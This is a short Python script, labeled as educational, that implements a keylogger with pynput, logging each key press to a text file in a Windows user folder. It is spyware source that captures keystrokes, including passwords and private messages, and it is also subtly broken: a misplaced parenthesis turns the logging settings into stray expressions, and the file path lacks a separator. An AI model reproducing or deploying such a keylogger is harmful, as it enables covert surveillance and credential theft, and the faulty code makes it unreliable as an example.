#This is for educational purposes only
import pynput
from pynput.keyboard import Key, Listener # type: ignore
import logging

log_dir = r"C:/User/Trini/CyAnProjects"

logging.basicConfig(filename= (log_dir + r"keyLog.txt")), logging._Level==logging.DEBUG, format=='%(asctime)s: %(message)s'

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
